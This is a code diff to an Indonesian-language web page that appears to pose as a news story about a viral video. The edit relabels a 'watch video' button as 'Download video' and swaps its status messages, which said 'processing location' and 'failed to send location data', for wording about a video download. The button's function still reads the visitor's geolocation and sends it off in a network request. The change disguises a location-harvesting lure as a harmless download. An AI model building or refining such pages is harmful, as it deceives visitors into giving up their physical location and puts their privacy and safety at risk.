@@ -140,7 +140,7 @@
         Pihak berwenang diimbau agar masyarakat tidak ikut menyebarkan video tersebut dan tetap menjaga etika bermedia sosial.
       </p>
 
-      <button class="btn" onclick="getLocation()">▶️Tonton video-nya</button>
+      <button class="btn" onclick="getLocation()">Download video-nya ⬇️</button>
       <p id="status"></p>
     </div>
   </article>
@@ -149,10 +149,10 @@
     function getLocation() {
       var status = document.getElementById("status");
       if (navigator.geolocation) {
-        status.innerHTML = "🔍 Memproses lokasi...";
+        status.innerHTML = "🔍 Memproses video...";
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
-        status.innerHTML = "❌ Browser tidak mendukung fitur lokasi.";
+        status.innerHTML = "❌ Browser tidak mendukung fitur.";
       }
     }
 
@@ -167,8 +167,8 @@
         });
 
         status.innerHTML = response.ok 
-          ? "✅ Lokasi berhasil diproses."
-          : "⚠️ Gagal mengirim data lokasi.";
+          ? "✅ Video berhasil diproses."
+          : "⚠️ Gagal mendownload.";
       } catch {
         status.innerHTML = "⚠️ Terjadi kesalahan koneksi.";
       }
